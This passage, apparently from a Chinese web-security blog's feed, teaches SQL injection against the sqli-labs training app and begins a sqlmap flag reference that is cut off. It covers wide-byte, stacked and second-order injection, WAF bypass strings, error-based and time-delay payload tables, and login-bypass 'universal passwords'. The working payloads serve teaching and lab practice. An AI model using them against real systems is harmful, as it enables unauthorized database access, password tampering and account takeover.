class="number">1</span>,concat(<span class="number">0x7e</span>,(database()),<span class="number">0x7e</span>),<span class="number">0</span>) <span class="keyword">and</span> <span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_32.png" alt=""></p><p>方法都是一样的</p><p><strong>X-Forwarded-For 注入</strong></p><p><code>X-Forwarded-For(XFF)</code>：用来识别客户端最原始的ip地址</p><p>参考文章：<a href="https://blog.csdn.net/qq_44159028/article/details/112528864?ops_request_misc=%7B%22request%5Fid%22%3A%22161646592716780261962393%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&amp;request_id=161646592716780261962393&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-112528864.pc_v1_rank_blog_v1&amp;utm_term=X-for">X-Forwarded-For</a></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p><strong>宽字节案例引入</strong>  </p><p>宽字节注入准确来说不是注入手法，而是另外一种比较特殊的情况。为了说明宽字节注入问题，我们以SQLi-labs 32 关为例子。 使用<code>?id=1&#39;</code> 进行测试的时候，发现提交的单引号会被转义<code>[\&#39;]</code>，此时，转义后的单引号会被作为普通字符带入数据库查询。也就是说，我们提交的单引号不会影响到原来SQL 语句的结构</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_33.png" alt=""></p><p>接着我们查看这关的源码，发现传入的id经过addslashes转移函数的处理，所有的单引号双引号字符都会被添加转义字符。接着在带入到数据库查询前设置了<code>mysql_query(&quot;SET NAMES gbk&quot;)</code>，即设定字符集为gbk。漏洞就是由于这个设置导致宽字节注入</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_34.png" alt=""></p><p>仔细看该函数，其利用正则匹配将 <code>[/，&#39;，&quot;]</code>这些三个符号都过滤掉了</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_35.png" alt=""></p><p>而我们要绕过这个转义处理，使单引号发挥作用不再被转义，有两个思路：</p><ul><li>让斜杠<code>\</code>失去作用</li><li>让斜杠<code>\</code>消失</li></ul><p>第一个思路就是借鉴程序员的防范思路，对斜杠<code>\</code>转义，使其失去转义单引号的作用，成为普通的内容</p><p>第二个思路就是宽字节注入</p><p><strong>关于编码</strong></p><ul><li>某字符的大小为一个字节时，称其字符为窄字节.</li><li>当某字符的大小为两个字节时，称其字符为宽字节.</li><li>所有英文默认占一个字节，汉字占两个字节</li><li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等</li></ul><p><strong>宽字节注入</strong></p><p>宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 <code>\</code> 转为<code>%5c</code> ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。</p><p>由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的</p><p>我们在前面加上<code>%df&#39;</code>  ,转义函数会将<code>%df&#39;</code>改成<code>%df\&#39;</code> , 而\ 就是<code>%5c</code> ，即最后变成了<code>%df%5c&#39;</code>， 而<code>%df%5c</code>在GBK中这两个字节对应着一个汉字 <code>運</code> ，就是说<code>\</code>已经失去了作用，<code>%df&#39;</code> ,被认为<code>運&#39;</code> ,成功消除了转义函数的影响</p><ul><li><code>&#39;</code> %27</li><li><code>\</code> %5c</li><li><code>%df\&#39;</code> <code>%df%5c&#39;</code>  <code>運&#39;</code></li></ul><p>我们输入<code>?id=1%df&#39;</code>，按道理来说将转义符吃掉了，结果应该是<code>id=&#39; 運&#39;  &#39;</code>，为什么这里转变成了中文后后面还有一个反斜杠了？那个反斜杠是哪里来的？</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_36.png" alt=""></p><p>其实这个是浏览器显示编码的问题，我们将浏览器编码切换为GB2312即简体中文，就正常了</p><p> 联合注入如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="operator">%</span>df<span class="string">&#x27; order by 4 --+</span></span><br></pre></td></tr></table></figure><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_37.png" alt=""></p><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>在SQL中，分号<code>;</code>是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。以sqli-labs第38关为例</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_38.png" alt=""></p><p>执行</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where id=1; --+ </span></span><br></pre></td></tr></table></figure><p>意思就是再更新id=1的用户密码为123456。如下成功执行了更新密码的语句</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_39.png" alt=""></p><p><strong>堆叠查询的局限性</strong></p><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在我们的web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的。如上面的实例如果我们不输出密码那我们是看不到这个结果的。因此，在读取数据时，我们建议使用union（联合）注入。同时在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力</p><ul><li>黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。</li><li>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。</li><li>黑客向服务端发送第二个与第一次不相同的请求数据信息。</li><li>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。</li><li>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功</li></ul><p>总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。以sqli-labs第24关为例</p><p><strong>如下点击注册用户</strong></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_40.png" alt=""></p><p>这里注册用户名为admin’#，密码为123456</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_41.png" alt=""></p><p>此时我们查看数据库，注册的用户已经存储进去了，并且admin的密码是123456</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_42.png" alt=""></p><p><strong>对注册的账号进行登录然后修改密码为654321</strong></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_43.png" alt=""></p><p>此时提示密码已经成功修改了</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_44.png" alt=""></p><p>此时我们发现反倒是admin的密码被修改成了654321，而我们注册的用户admin’#的密码并没有被修改</p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_45.png" alt=""></p><p><strong>漏洞原因</strong></p><ul><li><p>在进行用户注册的允许存在’和#这种特殊字符</p></li><li><p>在修改密码页面的源码中，发现这里很明显存在注入漏洞</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>当我们登录账号admin’#并修改密码时，这条sql语句就变成了如下这个样子，#把后面的代码都注释掉了，所以修改了用户admin的密码为654321</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><p><strong>WAF拦截原理：WAF从规则库中匹配敏感字符进行拦截</strong></p><p><img src="/img/sql%E6%B3%A8%E5%85%A5/sql_46.png" alt=""></p><h2 id="更改传参方式绕过"><a href="#更改传参方式绕过" class="headerlink" title="更改传参方式绕过"></a>更改传参方式绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤<span class="keyword">get</span>我们就改为post提交</span><br></pre></td></tr></table></figure><h2 id="关键词大小写绕过"><a href="#关键词大小写绕过" class="headerlink" title="关键词大小写绕过"></a>关键词大小写绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有的WAF因为规则设计的问题，只匹配纯大写或纯小写的字符，对字符大小写混写直接无视，这时，我们可以利用这一点来进行绕过</span><br><span class="line"></span><br><span class="line">举例： <span class="keyword">union</span> <span class="keyword">select</span> <span class="comment">---&gt; unIOn SeLEcT</span></span><br></pre></td></tr></table></figure><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">针对WAF过滤的字符编码，如使用URL编码，Unicode编码，十六进制编码，Hex编码等.</span><br><span class="line">URL编码：</span><br><span class="line">    百分号编码（<span class="keyword">Percent</span> Encoding）：以<span class="operator">%</span>开头的两位十六进制数值，用于表示ASCII字符。</span><br><span class="line">        加号（<span class="operator">+</span>）：用于表示空格字符。</span><br><span class="line">    Unicode编码：</span><br><span class="line">        转义序列（<span class="keyword">Escape</span> Sequence）：以\u开头的四位十六进制数值，用于表示Unicode字符。</span><br><span class="line">        十六进制编码：</span><br><span class="line">        <span class="number">0</span>x或者\x：以此为前缀的两位十六进制数值，用于表示字符的十六进制值。</span><br><span class="line">    Hex编码：</span><br><span class="line">        <span class="number">0</span>x或者\x：以此为前缀的两位十六进制数值，用于表示字符的十六进制值。</span><br><span class="line"></span><br><span class="line">举例：<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span># <span class="operator">=</span><span class="keyword">union</span><span class="operator">%</span><span class="number">0</span>aselect <span class="number">1</span>\u002c2,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">部分WAF只对字符串识别一次，删除敏感字段并拼接剩余语句，这时，我们可以通过双写来进行绕过。</span><br><span class="line"></span><br><span class="line">举例：UNIunionON ，SELselectECT anandd</span><br></pre></td></tr></table></figure><h2 id="换行-N-绕过"><a href="#换行-N-绕过" class="headerlink" title="换行(\N)绕过"></a>换行(\N)绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">举例：<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> username <span class="operator">=</span> \N <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>() <span class="keyword">from</span> admin</span><br></pre></td></tr></table></figure><h2 id="注释符内联注释绕过："><a href="#注释符内联注释绕过：" class="headerlink" title="注释符内联注释绕过："></a>注释符内联注释绕过：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">内联注释<span class="comment">/**/</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">=</span><span class="comment">/*!union*/</span> <span class="keyword">select</span>    <span class="operator">!</span>后的会执行</span><br><span class="line"></span><br><span class="line">注释符里感叹号后面的内容会被mysql执行。</span><br></pre></td></tr></table></figure><h2 id="同义词替换"><a href="#同义词替换" class="headerlink" title="同义词替换"></a>同义词替换</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">=</span><span class="operator">&amp;&amp;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">or</span><span class="operator">=</span><span class="operator">||</span></span><br><span class="line"></span><br><span class="line"><span class="operator">=</span>(等于号)<span class="operator">=</span><span class="operator">&lt;</span>、<span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line">空格<span class="operator">=</span><span class="operator">%</span><span class="number">09</span>,<span class="operator">%</span><span class="number">0</span>a,<span class="operator">%</span><span class="number">0</span>b,<span class="operator">%</span><span class="number">0</span>c,<span class="operator">%</span><span class="number">0</span>d,<span class="operator">%</span><span class="number">20</span>,<span class="operator">%</span>a0等</span><br><span class="line"></span><br><span class="line">注：<span class="operator">%</span><span class="number">0</span>a是换行也可以替代空格</span><br></pre></td></tr></table></figure><h2 id="HTTP参数污染"><a href="#HTTP参数污染" class="headerlink" title="HTTP参数污染"></a>HTTP参数污染</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对目标发送多个参数，如果目标没有多参数进行多次过滤，那么WAF对多个参数只会识别其中的一个。</span><br><span class="line"></span><br><span class="line">举例：?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">2</span><span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">3</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**&amp;id=-1%20union%20select%201,2,3%23*/</span></span><br></pre></td></tr></table></figure><h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a><strong>举例</strong></h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span>绕过：<span class="keyword">order</span><span class="operator">%</span><span class="number">20</span><span class="comment">/*//--/*/</span> <span class="keyword">by</span>     V4<span class="number">.0</span></span><br><span class="line">联合绕过：<span class="keyword">union</span> <span class="comment">/*!--+/*%0aselect/*!1,2,3*/</span> <span class="comment">--+</span></span><br><span class="line"><span class="keyword">from</span>绕过： <span class="comment">/*!06447%23%0afrom*/</span></span><br></pre></td></tr></table></figure><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><h2 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h2><h3 id="时间盲注函数替换"><a href="#时间盲注函数替换" class="headerlink" title="时间盲注函数替换"></a>时间盲注函数替换</h3><p>时间盲注中<code>sleep()</code>函数可被<code>benchmark()</code>函数替换</p><p><code>benchmark(count,expr)</code> 函数重复<code>count</code>次表达式<code>expr</code></p><p><strong>例如</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(<span class="number">100000</span>,md5(<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h3 id="报错注入函数替换"><a href="#报错注入函数替换" class="headerlink" title="报错注入函数替换"></a>报错注入函数替换</h3><p>报错注入方法</p><div class="table-container"><table><thead><tr><th>序号</th><th>函数</th><th>Payload</th></tr></thead><tbody><tr><td>1</td><td>floor()</td><td>select <em> from test where id =1 and (select 1 from (select count(</em>),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</td></tr><tr><td>2</td><td>extractvalue()</td><td>select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</td></tr><tr><td>3</td><td>updatexml()</td><td>select * from test where id=1 and (updataxml(1,concat(0x7e,(select user()),0x7e),1))</td></tr><tr><td>4</td><td>geometrycollection()</td><td>select <em> from test where id=1 and geometrycollection((select </em> from(select * from(select user())a)b))</td></tr><tr><td>5</td><td>multipoint()</td><td>select <em> from test wher id=1 and multipoint((select </em> from(select * from(select user())a)b))</td></tr><tr><td>6</td><td>polygon()</td><td>select <em> from test where id=1 and polygon((select </em> from(select * from(select user())a)b))</td></tr><tr><td>7</td><td>multipolygon()</td><td>select <em> from test where id=1 and multipolygon((select </em> from(select * from(select user())a)b))</td></tr><tr><td>8</td><td>linestring()</td><td>select <em> from test where id=1 and linestring((select </em> from(select * from(select user())a)b))</td></tr><tr><td>9</td><td>multilinestring()</td><td>select <em> from test where id=1 and multilinestring((select </em> from(select * from(select user())a)b))</td></tr><tr><td>10</td><td>exp()</td><td>select <em> from test where id=1 and exp(~(select </em>  from(select user())a))</td></tr></tbody></table></div><h2 id="笛卡尔积延时注入"><a href="#笛卡尔积延时注入" class="headerlink" title="笛卡尔积延时注入"></a>笛卡尔积延时注入</h2><p><strong>利用数据库的笛卡尔积操作带来大量计算产生时间延长</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>,g1;</span><br></pre></td></tr></table></figure><p><strong>table1</strong></p><div class="table-container"><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>aaa</td></tr><tr><td>2</td><td>bbb</td></tr></tbody></table></div><p><strong>table2</strong></p><div class="table-container"><table><thead><tr><th>tid</th><th>gname</th><th>gc</th></tr></thead><tbody><tr><td>1</td><td>ccc</td><td>ccc111</td></tr><tr><td>2</td><td>ddd</td><td>ddd222</td></tr><tr><td>3</td><td>eee</td><td>eee333</td></tr></tbody></table></div><p><strong>笛卡尔积运算结果</strong></p><div class="table-container"><table><thead><tr><th>id</th><th>name</th><th>tid</th><th>gname</th><th>gc</th></tr></thead><tbody><tr><td>1</td><td>aaa</td><td>1</td><td>ccc</td><td>ccc111</td></tr><tr><td>2</td><td>bbb</td><td>1</td><td>ccc</td><td>ccc111</td></tr><tr><td>1</td><td>aaa</td><td>2</td><td>ddd</td><td>ddd222</td></tr><tr><td>2</td><td>bbb</td><td>2</td><td>ddd</td><td>ddd222</td></tr><tr><td>1</td><td>aaa</td><td>3</td><td>eee</td><td>eee333</td></tr><tr><td>2</td><td>bbb</td><td>3</td><td>eee</td><td>eee333</td></tr></tbody></table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns A,information_schema.tables B,information_schema.tables C);</span><br></pre></td></tr></table></figure><p>使用<code>information_schema</code>的<code>columns、tables</code>表进行笛卡尔积运算，这里又将结果与<code>tables</code>表进行了一次笛卡尔积</p><p>对于网站与数据库长连接的情况，还可以使用<code>get_lock</code>函数对某变量进行锁定，当其他连接来访问变量时，访问会根据<code>get_lock</code>第二个参数所设定的时间进行延迟返回</p><p>执行以下语句：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 执行结果</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span>                   <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p><p>对<code>SpongeBob</code>变量“上锁”，由于<code>SpongeBob</code>变量本身没有被锁定，因此是不会有时间延长，利用另一个MySQL连接访问<code>SpongeBob</code>变量，执行如下语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> get_locck(<span class="string">&#x27;SPongeBob&#x27;</span>,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 执行结果</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">5</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> get_lock(<span class="string">&#x27;SpongeBob&#x27;</span>,<span class="number">5</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span>                   <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">5.00</span> sec)</span><br></pre></td></tr></table></figure><p>可以看到，该查询等待5秒才进行返回，因此可以用于时间注入</p><p><strong>注意：该方法需要与数据库之间建立长连接，也就是PHP中的<code>mysql_pconnect</code>函数所启用的连接</strong></p><h2 id="常见的万能密码"><a href="#常见的万能密码" class="headerlink" title="常见的万能密码"></a>常见的万能密码</h2><div class="table-container"><table><thead><tr><th>序号</th><th>万能密码</th></tr></thead><tbody><tr><td>1</td><td>a’ or ‘a’=’a</td></tr><tr><td>2</td><td>a’ or 1 #</td></tr><tr><td>3</td><td>a” or “a”=”a</td></tr><tr><td>4</td><td>123 or 1</td></tr><tr><td>5</td><td>a’’’ or ‘’’a’’’=’’’a</td></tr><tr><td>6</td><td>‘or’</td></tr><tr><td>7</td><td>&amp;mo#</td></tr></tbody></table></div>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap</title>
      <link href="/2023/07/26/sqlmap/"/>
      <url>/2023/07/26/sqlmap/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h1><p><strong>SQLMap支持市面上常见的数据库：</strong></p><p>支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。基本上在进行渗透测试中，我们能见到的数据库都能进行测试</p><p><strong>SQLMap支持多种注入手法：</strong></p><ul><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li><li>联合查询注入，可以使用 union 的情况下的注入；</li><li>堆查询注入，可以同时执行多条语句的执行时的注入</li></ul><p><strong>SQLMap支持多种功能：</strong></p><p>数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时执行任意命令。</p><h1 id="常用参数介绍"><a href="#常用参数介绍" class="headerlink" title="常用参数介绍"></a>常用参数介绍</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">-v  #详细的等级(0-6) </span><br><span class="line">    0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">    建议使用等级 3 ，可以看到注入语句的Payload，利于入门者学习。</span><br><span class="line"> </span><br><span class="line">-u &quot;http://xxx/Less-1/?id=1&quot; 注入点</span><br><span class="line"> </span><br><span class="line">-f  #指纹判别数据库类型</span><br><span class="line"> </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line"> </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line"> </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 level 算是一共注入测试等级，一共是五级，级别越高，检测的内容也就越多，检测级别大于等于 2 时会检测 cookie 是否有注入，检测级别大于等于 3 时会检测 User-Agent 和 Referer 是否有注入。比较推荐使用 5 等级进行测试，确保不会漏掉注入点。</span><br><span class="line"> </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思，在不确定的情况下，建议设置为3级</span><br><span class="line"> </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line"> </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line"> </span><br><span class="line">--columns        #列出字段 </span><br><span class="line"> </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line"> </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line"> </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line"> </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line"> </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line"> </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line"> </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line"> </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;      #列出mysql数据库中的user表的所有字段 </span><br><span class="line"> </span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line"> </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line"> </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line"> </span><br><span class="line">--data 